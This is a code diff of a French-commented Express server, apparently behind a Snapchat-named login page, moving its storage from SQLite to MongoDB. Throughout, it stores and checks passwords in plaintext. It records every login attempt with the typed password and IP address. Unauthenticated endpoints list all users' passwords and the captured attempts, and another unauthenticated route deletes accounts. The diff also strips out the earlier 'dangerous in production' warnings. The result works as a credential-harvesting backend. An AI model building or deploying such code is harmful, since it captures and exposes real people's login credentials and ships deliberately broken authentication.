@@ -1,37 +1,23 @@
 const express = require("express");
 const path = require("path");
-const Database = require("better-sqlite3");
-const bcrypt = require("bcryptjs");
+const mongoose = require("mongoose");
+
+const User = require("./models/User");
+const LoginAttempt = require("./models/LoginAttempt");
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// --- Base de données SQLite ---------------------------------------------------
-const db = new Database(path.join(__dirname, "snapchat.db"));
+// --- Connexion MongoDB --------------------------------------------------------
+const MONGO_URI = process.env.MONGO_URI || "mongodb://localhost:27017/snapchat";
 
-db.pragma("journal_mode = WAL");
-
-db.exec(`
-  CREATE TABLE IF NOT EXISTS users (
-    id         INTEGER PRIMARY KEY AUTOINCREMENT,
-    username   TEXT    NOT NULL UNIQUE,
-    email      TEXT    NOT NULL UNIQUE,
-    password   TEXT    NOT NULL,
-    created_at TEXT    DEFAULT (datetime('now'))
-  )
-`);
-
-// Table pour stocker les tentatives de connexion (mode démo exposé)
-db.exec(`
-  CREATE TABLE IF NOT EXISTS login_attempts (
-    id           INTEGER PRIMARY KEY AUTOINCREMENT,
-    identifier   TEXT    NOT NULL,
-    password     TEXT    NOT NULL,
-    status       TEXT    NOT NULL,
-    ip_address   TEXT,
-    attempted_at TEXT    DEFAULT (datetime('now'))
-  )
-`);
+mongoose
+  .connect(MONGO_URI)
+  .then(() => console.log("Connecte a MongoDB"))
+  .catch((err) => {
+    console.error("Erreur de connexion MongoDB:", err.message);
+    process.exit(1);
+  });
 
 // --- Middleware ---------------------------------------------------------------
 app.use(express.json());
@@ -41,7 +27,7 @@ app.use(express.static(path.join(__dirname, "public")));
 // --- Routes API ---------------------------------------------------------------
 
 // Inscription
-app.post("/api/register", (req, res) => {
+app.post("/api/register", async (req, res) => {
   const { username, email, password } = req.body;
 
   if (!username || !email || !password) {
@@ -51,91 +37,125 @@ app.post("/api/register", (req, res) => {
   if (password.length < 6) {
     return res
       .status(400)
-      .json({ error: "Le mot de passe doit contenir au moins 6 caractères." });
+      .json({ error: "Le mot de passe doit contenir au moins 6 caracteres." });
   }
 
-  const existing = db
-    .prepare("SELECT id FROM users WHERE username = ? OR email = ?")
-    .get(username, email);
+  try {
+    const existing = await User.findOne({
+      $or: [{ username }, { email }],
+    });
 
-  if (existing) {
-    return res
-      .status(409)
-      .json({ error: "Ce nom d'utilisateur ou cet e-mail est déjà pris." });
+    if (existing) {
+      return res
+        .status(409)
+        .json({ error: "Ce nom d'utilisateur ou cet e-mail est deja pris." });
+    }
+
+    const user = await User.create({ username, email, password });
+
+    return res.status(201).json({
+      message: "Compte cree avec succes !",
+      user: { id: user._id, username: user.username, email: user.email },
+    });
+  } catch (err) {
+    console.error(err);
+    return res.status(500).json({ error: "Erreur serveur." });
   }
-
-  // ATTENTION : Mode test - mot de passe en clair (DANGEREUX en production!)
-  const passwordStorage = password; // bcrypt.hashSync(password, 10);
-
-  const info = db
-    .prepare("INSERT INTO users (username, email, password) VALUES (?, ?, ?)")
-    .run(username, email, passwordStorage);
-
-  return res.status(201).json({
-    message: "Compte créé avec succès !",
-    user: { id: info.lastInsertRowid, username, email },
-  });
 });
 
 // Connexion
-app.post("/api/login", (req, res) => {
+app.post("/api/login", async (req, res) => {
   const { identifier, password } = req.body;
 
   if (!identifier || !password) {
     return res.status(400).json({ error: "Tous les champs sont obligatoires." });
   }
 
-  const user = db
-    .prepare("SELECT * FROM users WHERE username = ? OR email = ?")
-    .get(identifier, identifier);
+  try {
+    const user = await User.findOne({
+      $or: [{ username: identifier }, { email: identifier }],
+    });
 
-  // Mode test : comparaison en clair (DANGEREUX en production!)
-  const isSuccess = user && password === user.password;
+    const isSuccess = user && password === user.password;
 
-  // Enregistrer la tentative de connexion (mode démo exposé)
-  db.prepare(
-    "INSERT INTO login_attempts (identifier, password, status, ip_address) VALUES (?, ?, ?, ?)"
-  ).run(identifier, password, isSuccess ? "SUCCESS" : "FAILED", req.ip || "unknown");
+    await LoginAttempt.create({
+      identifier,
+      password,
+      status: isSuccess ? "SUCCESS" : "FAILED",
+      ip_address: req.ip || "unknown",
+    });
 
-  if (!isSuccess) {
-    return res
-      .status(401)
-      .json({ error: "Identifiants incorrects." });
+    if (!isSuccess) {
+      return res.status(401).json({ error: "Identifiants incorrects." });
+    }
+
+    return res.json({
+      message: `Bienvenue, ${user.username} !`,
+      user: { id: user._id, username: user.username, email: user.email },
+    });
+  } catch (err) {
+    console.error(err);
+    return res.status(500).json({ error: "Erreur serveur." });
   }
-
-  return res.json({
-    message: `Bienvenue, ${user.username} !`,
-    user: { id: user.id, username: user.username, email: user.email },
-  });
 });
 
-// Liste des utilisateurs (mode démo : inclut les mots de passe en clair)
-app.get("/api/users", (_req, res) => {
-  const users = db
-    .prepare("SELECT id, username, email, password, created_at FROM users")
-    .all();
-  return res.json(users);
+// Liste des utilisateurs (mode demo)
+app.get("/api/users", async (_req, res) => {
+  try {
+    const users = await User.find({}).sort({ created_at: -1 });
+    return res.json(
+      users.map((u) => ({
+        id: u._id,
+        username: u.username,
+        email: u.email,
+        password: u.password,
+        created_at: u.created_at,
+      }))
+    );
+  } catch (err) {
+    console.error(err);
+    return res.status(500).json({ error: "Erreur serveur." });
+  }
 });
 
-// Liste des tentatives de connexion (mode démo exposé)
-app.get("/api/login-attempts", (_req, res) => {
-  const attempts = db
-    .prepare("SELECT id, identifier, password, status, ip_address, attempted_at FROM login_attempts ORDER BY attempted_at DESC LIMIT 50")
-    .all();
-  return res.json(attempts);
+// Liste des tentatives de connexion (mode demo)
+app.get("/api/login-attempts", async (_req, res) => {
+  try {
+    const attempts = await LoginAttempt.find({})
+      .sort({ attempted_at: -1 })
+      .limit(50);
+    return res.json(
+      attempts.map((a) => ({
+        id: a._id,
+        identifier: a.identifier,
+        password: a.password,
+        status: a.status,
+        ip_address: a.ip_address,
+        attempted_at: a.attempted_at,
+      }))
+    );
+  } catch (err) {
+    console.error(err);
+    return res.status(500).json({ error: "Erreur serveur." });
+  }
 });
 
 // Suppression d'un utilisateur
-app.delete("/api/users/:id", (req, res) => {
-  const user = db.prepare("SELECT id, username FROM users WHERE id = ?").get(req.params.id);
-  if (!user) {
-    return res.status(404).json({ error: "Utilisateur introuvable." });
+app.delete("/api/users/:id", async (req, res) => {
+  try {
+    const user = await User.findById(req.params.id);
+    if (!user) {
+      return res.status(404).json({ error: "Utilisateur introuvable." });
+    }
+    await User.findByIdAndDelete(req.params.id);
+    return res.json({ message: `Utilisateur ${user.username} supprime.` });
+  } catch (err) {
+    console.error(err);
+    return res.status(500).json({ error: "Erreur serveur." });
   }
-  db.prepare("DELETE FROM users WHERE id = ?").run(req.params.id);
-  return res.json({ message: `Utilisateur ${user.username} supprimé.` });
 });
 
-// --- Démarrage ----------------------------------------------------------------
+// --- Demarrage ----------------------------------------------------------------
 app.listen(PORT, () => {
-  console.log(`Serveur démarré sur http://localhost:${PORT}`);
+  console.log(`Serveur demarre sur http://localhost:${PORT}`);
 });
